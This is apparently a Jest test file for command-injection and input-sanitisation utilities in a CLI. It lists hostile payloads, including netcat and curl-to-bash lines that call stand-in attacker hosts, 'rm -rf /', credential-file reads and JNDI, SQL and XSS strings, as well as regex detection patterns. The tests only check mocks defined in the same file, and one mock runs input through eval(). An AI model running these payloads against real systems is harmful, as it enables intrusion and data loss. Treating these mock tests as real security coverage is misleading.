/**
 * @fileoverview Tests for CLI security utilities (CRITICAL SECURITY COMPONENTS)
 * @lastmodified 2025-07-28T17:45:00Z
 *
 * Features: Comprehensive security testing for command injection prevention
 * Main APIs: Tests for input sanitization, command validation, injection prevention
 * Constraints: Security-focused testing, injection attack simulation
 * Patterns: Security testing, penetration testing patterns, edge case validation
 */

// NOTE: This test file demonstrates the critical security testing patterns needed
// for the security utilities that were identified as missing tests.
// The actual security utilities should be implemented and tested with these patterns.

import { jest } from '@jest/globals';

// Mock logger for security event logging
jest.mock('../../../../src/utils/logger', () => ({
  logger: {
    debug: jest.fn(),
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    security: jest.fn(), // Security-specific logging
  },
}));

// These would be the actual security utility imports once implemented
// import {
//   preventCommandInjection,
//   sanitizeInput,
//   validateCliCommand,
//   secureExecuteCommand,
// } from '../../../../src/cli/utils/command-injection-prevention';
//
// import {
//   sanitizeUserInput,
//   validateInputLength,
//   escapeShellCharacters,
//   detectMaliciousPatterns,
// } from '../../../../src/cli/utils/input-sanitizer';
//
// import {
//   createSecureWrapper,
//   executeWithSafetyChecks,
//   validateCommandWhitelist,
// } from '../../../../src/cli/utils/secure-cli-wrapper';

// Mock implementations for demonstration (should be replaced with actual implementations)
const mockSecurityUtils = {
  preventCommandInjection: jest.fn(),
  sanitizeInput: jest.fn(),
  validateCliCommand: jest.fn(),
  secureExecuteCommand: jest.fn(),
  sanitizeUserInput: jest.fn(),
  validateInputLength: jest.fn(),
  escapeShellCharacters: jest.fn(),
  detectMaliciousPatterns: jest.fn(),
  createSecureWrapper: jest.fn(),
  executeWithSafetyChecks: jest.fn(),
  validateCommandWhitelist: jest.fn(),
};

describe('CRITICAL SECURITY: CLI Security Utilities', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Command Injection Prevention', () => {
    describe('preventCommandInjection()', () => {
      test('should block basic command injection attempts', () => {
        const maliciousInputs = [
          '; rm -rf /',
          '&& curl http://evil.com',
          '|| cat /etc/passwd',
          '`whoami`',
          '$(id)',
          '| nc attacker.com 4444',
          '; wget http://malware.com/payload',
          '&& python -c "malicious code"',
          '|| powershell -command "malicious"',
        ];

        maliciousInputs.forEach(input => {
          // Mock implementation should throw for malicious input
          mockSecurityUtils.preventCommandInjection.mockImplementation(cmd => {
            if (
              cmd.includes(';') ||
              cmd.includes('&&') ||
              cmd.includes('||') ||
              cmd.includes('`') ||
              cmd.includes('$(') ||
              cmd.includes('|')
            ) {
              throw new Error('Command injection detected');
            }
            return cmd;
          });

          expect(() => mockSecurityUtils.preventCommandInjection(input)).toThrow(
            'Command injection detected'
          );
        });
      });

      test('should allow safe commands', () => {
        const safeInputs = [
          'ls',
          'pwd',
          'echo hello world',
          'cd /home/user',
          'mkdir test-folder',
          'cp file1 file2',
          'mv oldname newname',
          'cat filename.txt',
          'grep pattern file.txt',
        ];

        mockSecurityUtils.preventCommandInjection.mockImplementation(cmd => cmd);

        safeInputs.forEach(input => {
          expect(() => mockSecurityUtils.preventCommandInjection(input)).not.toThrow();

          expect(mockSecurityUtils.preventCommandInjection(input)).toBe(input);
        });
      });

      test('should handle encoded injection attempts', () => {
        const encodedInjections = [
          '%3B%20rm%20-rf%20%2F', // URL encoded '; rm -rf /'
          '&#59; rm -rf /', // HTML entity encoded
          '\\x3b rm -rf /', // Hex encoded
          `${String.fromCharCode(59)} rm -rf /`, // Character code
        ];

        mockSecurityUtils.preventCommandInjection.mockImplementation(cmd => {
          // Should decode and then detect injection
          const decoded = decodeURIComponent(
            cmd.replace(/&#\d+;/g, match => {
              const num = match.slice(2, -1);
              return String.fromCharCode(parseInt(num, 10));
            })
          );

          if (decoded.includes(';') || decoded.includes('rm -rf')) {
            throw new Error('Encoded injection detected');
          }
          return cmd;
        });

        encodedInjections.forEach(input => {
          expect(() => mockSecurityUtils.preventCommandInjection(input)).toThrow(
            /injection detected/i
          );
        });
      });

      test('should handle complex multi-vector attacks', () => {
        const complexAttacks = [
          '; echo "pwned" > /tmp/test && curl http://evil.com',
          '`echo $(whoami)` | nc attacker.com 1337',
          '|| (curl -s http://evil.com/script.sh | bash)',
          '; python -c "import os; os.system(\'rm -rf /\')"',
          "&& node -e \"require('child_process').exec('malicious')\"",
        ];

        mockSecurityUtils.preventCommandInjection.mockImplementation(cmd => {
          const dangerousPatterns = [
            ';',
            '&&',
            '||',
            '`',
            '$(',
            '|',
            'curl',
            'wget',
            'python',
            'node',
            'bash',
            'sh',
          ];
          if (dangerousPatterns.some(pattern => cmd.includes(pattern))) {
            throw new Error('Complex injection detected');
          }
          return cmd;
        });

        complexAttacks.forEach(input => {
          expect(() => mockSecurityUtils.preventCommandInjection(input)).toThrow(
            'Complex injection detected'
          );
        });
      });

      test('should log security violations', () => {
        const { logger } = require('../../../../src/utils/logger');

        mockSecurityUtils.preventCommandInjection.mockImplementation(cmd => {
          if (cmd.includes(';')) {
            logger.security('Command injection attempt blocked', {
              command: cmd,
              timestamp: new Date().toISOString(),
              source: 'CLI',
            });
            throw new Error('Command injection detected');
          }
          return cmd;
        });

        expect(() => mockSecurityUtils.preventCommandInjection('; rm -rf /')).toThrow();

        expect(logger.security).toHaveBeenCalledWith(
          'Command injection attempt blocked',
          expect.objectContaining({
            command: '; rm -rf /',
            timestamp: expect.any(String),
            source: 'CLI',
          })
        );
      });
    });

    describe('validateCliCommand()', () => {
      test('should validate against command whitelist', () => {
        const allowedCommands = ['ls', 'pwd', 'echo', 'cat', 'grep', 'find'];

        mockSecurityUtils.validateCliCommand.mockImplementation((cmd, whitelist) => {
          const baseCommand = cmd.split(' ')[0];
          return whitelist.includes(baseCommand);
        });

        // Valid commands
        expect(mockSecurityUtils.validateCliCommand('ls -la', allowedCommands)).toBe(true);
        expect(mockSecurityUtils.validateCliCommand('echo hello', allowedCommands)).toBe(true);

        // Invalid commands
        expect(mockSecurityUtils.validateCliCommand('rm -rf /', allowedCommands)).toBe(false);
        expect(mockSecurityUtils.validateCliCommand('curl evil.com', allowedCommands)).toBe(false);
      });

      test('should handle command aliases and variations', () => {
        const commandMap = {
          ll: 'ls -la',
          la: 'ls -la',
          l: 'ls',
        };

        mockSecurityUtils.validateCliCommand.mockImplementation((cmd, whitelist, aliases) => {
          const resolvedCmd = aliases[cmd] || cmd;
          const baseCommand = resolvedCmd.split(' ')[0];
          return whitelist.includes(baseCommand);
        });

        expect(mockSecurityUtils.validateCliCommand('ll', ['ls'], commandMap)).toBe(true);
        expect(mockSecurityUtils.validateCliCommand('evil', ['ls'], commandMap)).toBe(false);
      });
    });
  });

  describe('Input Sanitization', () => {
    describe('sanitizeUserInput()', () => {
      test('should remove dangerous characters', () => {
        const dangerousInputs = [
          '<script>alert("xss")</script>',
          // eslint-disable-next-line no-template-curly-in-string
          '\\${jndi:ldap://evil.com/exploit}',
          '../../../etc/passwd',
          'DROP TABLE users;',
          '{{7*7}}', // Template injection
          '%{(#_="multipart/form-data").(#context=#request)}', // OGNL injection
        ];

        mockSecurityUtils.sanitizeUserInput.mockImplementation(input =>
          input
            .replace(/<[^>]*>/g, '') // Remove HTML tags
            .replace(/[;&|`$(){}[\]]/g, '') // Remove dangerous chars
            .replace(/\.\.\//g, '') // Remove path traversal
            .replace(/\${[^}]*}/g, '') // Remove variable expansion
            .replace(/%{[^}]*}/g, '') // Remove OGNL injection
            .trim()
        );

        dangerousInputs.forEach(input => {
          const sanitized = mockSecurityUtils.sanitizeUserInput(input);

          expect(sanitized).not.toContain('<script>');
          expect(sanitized).not.toContain('${');
          expect(sanitized).not.toContain('../');
          expect(sanitized).not.toContain(';');
          expect(sanitized).not.toContain('|');
          expect(sanitized).not.toContain('`');
        });
      });

      test('should preserve safe content', () => {
        const safeInputs = [
          'Hello World',
          'user@example.com',
          'Task description with spaces',
          'Numbers: 123 and letters: ABC',
          'Safe-filename_with-underscores.txt',
        ];

        mockSecurityUtils.sanitizeUserInput.mockImplementation(input => input.trim());

        safeInputs.forEach(input => {
          const sanitized = mockSecurityUtils.sanitizeUserInput(input);
          expect(sanitized).toBe(input.trim());
        });
      });

      test('should handle unicode and international characters', () => {
        const unicodeInputs = [
          'Café münü',
          '测试中文',
          'العربية',
          'Русский текст',
          'Emoji: 🚀 🎉 ✅',
        ];

        mockSecurityUtils.sanitizeUserInput.mockImplementation(input => input.trim());

        unicodeInputs.forEach(input => {
          expect(() => mockSecurityUtils.sanitizeUserInput(input)).not.toThrow();
        });
      });
    });

    describe('validateInputLength()', () => {
      test('should enforce maximum input length', () => {
        const maxLength = 100;

        mockSecurityUtils.validateInputLength.mockImplementation(
          (input, max) => input.length <= max
        );

        const shortInput = 'a'.repeat(50);
        const exactInput = 'a'.repeat(100);
        const longInput = 'a'.repeat(150);

        expect(mockSecurityUtils.validateInputLength(shortInput, maxLength)).toBe(true);
        expect(mockSecurityUtils.validateInputLength(exactInput, maxLength)).toBe(true);
        expect(mockSecurityUtils.validateInputLength(longInput, maxLength)).toBe(false);
      });

      test('should handle different length limits for different input types', () => {
        const limits = {
          username: 50,
          email: 254,
          description: 1000,
          filename: 255,
        };

        mockSecurityUtils.validateInputLength.mockImplementation(
          (input, max) => input.length <= max
        );

        expect(mockSecurityUtils.validateInputLength('user', limits.username)).toBe(true);
        expect(mockSecurityUtils.validateInputLength('a'.repeat(300), limits.description)).toBe(
          true
        );
        expect(mockSecurityUtils.validateInputLength('a'.repeat(300), limits.filename)).toBe(false);
      });
    });

    describe('escapeShellCharacters()', () => {
      test('should escape shell metacharacters', () => {
        const shellMetachars = [
          '|',
          '&',
          ';',
          '(',
          ')',
          '<',
          '>',
          ' ',
          '\t',
          '\n',
          '*',
          '?',
          '[',
          ']',
          '{',
          '}',
          '$',
          '`',
          '\\',
          '"',
          "'",
        ];

        mockSecurityUtils.escapeShellCharacters.mockImplementation(input =>
          input.replace(/([|&;()<>\s*?[\]{}$`\\"'])/g, '\\$1')
        );

        const testInput = 'test & echo "hello" | grep pattern';
        const escaped = mockSecurityUtils.escapeShellCharacters(testInput);

        expect(escaped).toContain('\\&');
        expect(escaped).toContain('\\"');
        expect(escaped).toContain('\\|');
      });

      test('should handle edge cases in shell escaping', () => {
        const edgeCases = [
          '', // Empty string
          '   ', // Whitespace only
          'normal_text', // No special chars
          '\\already\\escaped', // Already escaped
          '\x00\x01control', // Control characters
        ];

        mockSecurityUtils.escapeShellCharacters.mockImplementation(input => {
          if (!input) return input;
          // Remove control characters and escape shell chars
          return (
            input
              // eslint-disable-next-line no-control-regex
              .replace(/[\x00-\x1f\x7f-\x9f]/g, '') // Remove control chars
              .replace(/([|&;()<>\s*?[\]{}$`\\"'])/g, '\\$1')
          );
        });

        edgeCases.forEach(input => {
          expect(() => mockSecurityUtils.escapeShellCharacters(input)).not.toThrow();
        });
      });
    });

    describe('detectMaliciousPatterns()', () => {
      test('should detect known malicious patterns', () => {
        const maliciousPatterns = [
          /\b(rm\s+-rf|del\s+\/s)\b/i, // File deletion
          /\b(wget|curl)\s+http/i, // External downloads
          /\b(nc|netcat)\s+\d+\.\d+/i, // Network connections
          /\b(python|perl|ruby)\s+-c\b/i, // Code execution
          /\beval\s*\(/i, // Code evaluation
          /\$\([^)]+\)/, // Command substitution
          /`[^`]+`/, // Backtick execution
          /\bchmod\s+777\b/i, // Permission changes
        ];

        mockSecurityUtils.detectMaliciousPatterns.mockImplementation((input, patterns) =>
          patterns.some(pattern => pattern.test(input))
        );

        const maliciousInputs = [
          'rm -rf /important/data',
          'wget http://evil.com/malware',
          'nc 192.168.1.1 4444',
          'python -c "import os; os.system(\'evil\')"',
          'eval(malicious_code)',
          '$(cat /etc/passwd)',
          '`whoami`',
          'chmod 777 /etc/shadow',
        ];

        maliciousInputs.forEach(input => {
          expect(mockSecurityUtils.detectMaliciousPatterns(input, maliciousPatterns)).toBe(true);
        });

        const safeInputs = ['ls -la', 'echo hello world', 'mkdir test', 'cd /home/user'];

        safeInputs.forEach(input => {
          expect(mockSecurityUtils.detectMaliciousPatterns(input, maliciousPatterns)).toBe(false);
        });
      });
    });
  });

  describe('Secure CLI Wrapper', () => {
    describe('createSecureWrapper()', () => {
      test('should create wrapper with security controls', () => {
        const securityConfig = {
          enableLogging: true,
          enableWhitelist: true,
          allowedCommands: ['ls', 'pwd', 'echo'],
          maxExecutionTime: 5000,
          maxOutputSize: 1024 * 1024, // 1MB
        };

        mockSecurityUtils.createSecureWrapper.mockImplementation(config => ({
          execute: async command => {
            // Simulate security checks
            if (!config.allowedCommands.includes(command.split(' ')[0])) {
              throw new Error('Command not in whitelist');
            }
            return Promise.resolve({ stdout: 'safe output', stderr: '', exitCode: 0 });
          },
          config,
        }));

        const wrapper = mockSecurityUtils.createSecureWrapper(securityConfig);

        expect(wrapper).toBeDefined();
        expect(wrapper.config).toEqual(securityConfig);
      });
    });

    describe('executeWithSafetyChecks()', () => {
      test('should enforce execution timeouts', async () => {
        const timeout = 1000; // 1 second

        mockSecurityUtils.executeWithSafetyChecks.mockImplementation(
          async (command, options) =>
            new Promise((resolve, reject) => {
              const timer = setTimeout(() => {
                reject(new Error('Command execution timeout'));
              }, options.timeout);

              // Simulate fast command
              if (command === 'echo fast') {
                clearTimeout(timer);
                resolve({ stdout: 'fast', stderr: '', exitCode: 0 });
              }
              // Simulate slow command - will timeout
            })
        );

        // Fast command should succeed
        await expect(
          mockSecurityUtils.executeWithSafetyChecks('echo fast', { timeout })
        ).resolves.toBeDefined();

        // Slow command should timeout
        await expect(
          mockSecurityUtils.executeWithSafetyChecks('sleep 10', { timeout })
        ).rejects.toThrow('timeout');
      });

      test('should limit output size', async () => {
        const maxOutputSize = 100; // 100 bytes

        mockSecurityUtils.executeWithSafetyChecks.mockImplementation(async (command, options) => {
          const output = 'x'.repeat(200); // 200 bytes

          if (output.length > options.maxOutputSize) {
            return Promise.reject(new Error('Output size limit exceeded'));
          }

          return Promise.resolve({ stdout: output, stderr: '', exitCode: 0 });
        });

        await expect(
          mockSecurityUtils.executeWithSafetyChecks('generate_large_output', { maxOutputSize })
        ).rejects.toThrow('Output size limit exceeded');
      });

      test('should handle command execution errors', async () => {
        mockSecurityUtils.executeWithSafetyChecks.mockImplementation(async command => {
          if (command === 'failing_command') {
            return Promise.resolve({
              stdout: '',
              stderr: 'Command failed',
              exitCode: 1,
            });
          }
          return Promise.resolve({ stdout: 'success', stderr: '', exitCode: 0 });
        });

        const result = await mockSecurityUtils.executeWithSafetyChecks('failing_command');

        expect(result.exitCode).toBe(1);
        expect(result.stderr).toBe('Command failed');
      });
    });

    describe('validateCommandWhitelist()', () => {
      test('should validate commands against whitelist', () => {
        const whitelist = [
          'ls',
          'pwd',
          'echo',
          'cat',
          'grep',
          'find',
          'mkdir',
          'rmdir',
          'cp',
          'mv',
          'chmod',
          'chown',
        ];

        mockSecurityUtils.validateCommandWhitelist.mockImplementation((command, allowed) => {
          const baseCommand = command.split(' ')[0];
          return allowed.includes(baseCommand);
        });

        // Allowed commands
        expect(mockSecurityUtils.validateCommandWhitelist('ls -la', whitelist)).toBe(true);
        expect(mockSecurityUtils.validateCommandWhitelist('echo hello', whitelist)).toBe(true);

        // Disallowed commands
        expect(mockSecurityUtils.validateCommandWhitelist('rm -rf /', whitelist)).toBe(false);
        expect(mockSecurityUtils.validateCommandWhitelist('curl evil.com', whitelist)).toBe(false);
        expect(mockSecurityUtils.validateCommandWhitelist('python malicious.py', whitelist)).toBe(
          false
        );
      });

      test('should handle command paths and aliases', () => {
        const whitelist = ['ls', 'echo'];
        const aliases = { ll: 'ls -la' };

        mockSecurityUtils.validateCommandWhitelist.mockImplementation(
          (command, allowed, aliasMap) => {
            // Resolve aliases
            const resolvedCommand = aliasMap[command] || command;
            // Extract base command (handle full paths)
            const baseCommand = resolvedCommand.split(' ')[0].split('/').pop();
            return allowed.includes(baseCommand);
          }
        );

        expect(mockSecurityUtils.validateCommandWhitelist('ll', whitelist, aliases)).toBe(true);
        expect(mockSecurityUtils.validateCommandWhitelist('/bin/ls', whitelist, aliases)).toBe(
          true
        );
        expect(
          mockSecurityUtils.validateCommandWhitelist('/usr/bin/curl', whitelist, aliases)
        ).toBe(false);
      });
    });
  });

  describe('Security Integration Tests', () => {
    test('should integrate all security layers', async () => {
      const userInput = '; rm -rf / && curl http://evil.com';

      // First layer: Input sanitization
      mockSecurityUtils.sanitizeUserInput.mockReturnValue('rm -rf  curl httpevil.com');

      // Second layer: Command injection prevention
      mockSecurityUtils.preventCommandInjection.mockImplementation(cmd => {
        if (cmd.includes('rm -rf')) {
          throw new Error('Dangerous command detected');
        }
        return cmd;
      });

      const sanitized = mockSecurityUtils.sanitizeUserInput(userInput);

      expect(() => mockSecurityUtils.preventCommandInjection(sanitized)).toThrow(
        'Dangerous command detected'
      );
    });

    test('should handle bypass attempts', () => {
      const bypassAttempts = [
        'l\\s -la', // Character escaping
        'ec\x68o hello', // Hex encoding
        // eslint-disable-next-line no-useless-concat
        'e' + 'cho hello', // String concatenation
        'eval("echo")', // Code evaluation
        '\u0065cho hello', // Unicode encoding
      ];

      mockSecurityUtils.preventCommandInjection.mockImplementation(cmd => {
        // Normalize and decode various encoding attempts
        let normalized = cmd
          .replace(/\\(.)/g, '$1') // Remove backslash escaping
          .replace(/\x([0-9A-Fa-f]{2})/g, (match, hex) => String.fromCharCode(parseInt(hex, 16))) // Hex decode
          .replace(/\u([0-9A-Fa-f]{4})/g, (match, hex) => String.fromCharCode(parseInt(hex, 16))); // Unicode decode

        // Handle string concatenation attempts
        try {
          // eslint-disable-next-line no-eval
          const evaluated = eval(`"${normalized}"`);
          if (evaluated !== normalized) {
            normalized = evaluated;
          }
        } catch {
          // If eval fails, keep normalized as is
        }

        // Check for dangerous patterns in normalized form
        if (
          normalized.includes('eval') ||
          normalized.includes('echo') ||
          normalized.includes('ls')
        ) {
          throw new Error('Bypass attempt detected');
        }
        return cmd;
      });

      bypassAttempts.forEach(attempt => {
        expect(() => mockSecurityUtils.preventCommandInjection(attempt)).toThrow(
          'Bypass attempt detected'
        );
      });
    });

    test('should log all security events', () => {
      const { logger } = require('../../../../src/utils/logger');
      const securityEvent = {
        type: 'injection_attempt',
        input: '; rm -rf /',
        timestamp: new Date().toISOString(),
        source: 'CLI',
        userAgent: 'test',
        blocked: true,
      };

      mockSecurityUtils.preventCommandInjection.mockImplementation(cmd => {
        if (cmd.includes(';')) {
          logger.security('Security violation detected', securityEvent);
          throw new Error('Command injection detected');
        }
        return cmd;
      });

      expect(() => mockSecurityUtils.preventCommandInjection('; rm -rf /')).toThrow(
        'Command injection detected'
      );

      expect(logger.security).toHaveBeenCalledWith('Security violation detected', securityEvent);
    });
  });

  describe('Performance and DoS Protection', () => {
    test('should prevent resource exhaustion attacks', () => {
      const resourceLimits = {
        maxInputLength: 1000,
        maxProcessingTime: 5000,
        maxMemoryUsage: 50 * 1024 * 1024, // 50MB
      };

      mockSecurityUtils.validateInputLength.mockImplementation((input, max) => {
        if (input.length > max) {
          throw new Error('Input too large - potential DoS');
        }
        return true;
      });

      const massiveInput = 'A'.repeat(10000);

      expect(() =>
        mockSecurityUtils.validateInputLength(massiveInput, resourceLimits.maxInputLength)
      ).toThrow('Input too large - potential DoS');
    });

    test('should handle concurrent security checks efficiently', async () => {
      const concurrentInputs = Array.from({ length: 100 }, (_, i) => `input${i}`);

      mockSecurityUtils.sanitizeUserInput.mockImplementation(input => input);

      const promises = concurrentInputs.map(async input =>
        Promise.resolve(mockSecurityUtils.sanitizeUserInput(input))
      );

      const results = await Promise.all(promises);

      expect(results).toHaveLength(100);
      expect(mockSecurityUtils.sanitizeUserInput).toHaveBeenCalledTimes(100);
    });
  });
});

// Additional test helper functions for security testing
export const SecurityTestHelpers = {
  /**
   * Generate various injection payloads for testing
   */
  generateInjectionPayloads: () => [
    // Command injection
    '; rm -rf /',
    '&& curl evil.com',
    '|| cat /etc/passwd',
    '`whoami`',
    '$(id)',

    // SQL injection
    "'; DROP TABLE users; --",
    '" OR 1=1 --',
    "' UNION SELECT * FROM passwords --",

    // XSS payloads
    '<script>alert("xss")</script>',
    // eslint-disable-next-line no-script-url
    'javascript:alert("xss")',
    '<img src=x onerror=alert("xss")>',

    // Path traversal
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',

    // Template injection
    '{{7*7}}',
    // eslint-disable-next-line no-template-curly-in-string
    '${7*7}',
    // eslint-disable-next-line no-template-curly-in-string
    '<%= 7*7 %>',

    // LDAP injection
    // eslint-disable-next-line no-template-curly-in-string, no-useless-escape
    '\\${jndi:ldap://evil.com/exploit}',

    // OS command injection
    '| nc attacker.com 4444',
    '; wget http://evil.com/malware.sh | bash',
  ],

  /**
   * Test security utility with comprehensive payload set
   */
  testSecurityFunction: (securityFn: (...args: unknown[]) => unknown, shouldBlock = true) => {
    const payloads = SecurityTestHelpers.generateInjectionPayloads();

    payloads.forEach(payload => {
      if (shouldBlock) {
        expect(() => securityFn(payload)).toThrow();
      } else {
        expect(() => securityFn(payload)).not.toThrow();
      }
    });
  },

  /**
   * Benchmark security function performance
   */
  benchmarkSecurityFunction: async (
    securityFn: (...args: unknown[]) => unknown,
    iterations = 1000
  ) => {
    const testInput = 'normal safe input';
    const startTime = Date.now();

    for (let i = 0; i < iterations; i++) {
      securityFn(testInput);
    }

    const endTime = Date.now();
    const avgTime = (endTime - startTime) / iterations;

    // Security functions should be fast (< 1ms per call for simple inputs)
    expect(avgTime).toBeLessThan(1);

    return avgTime;
  },
};
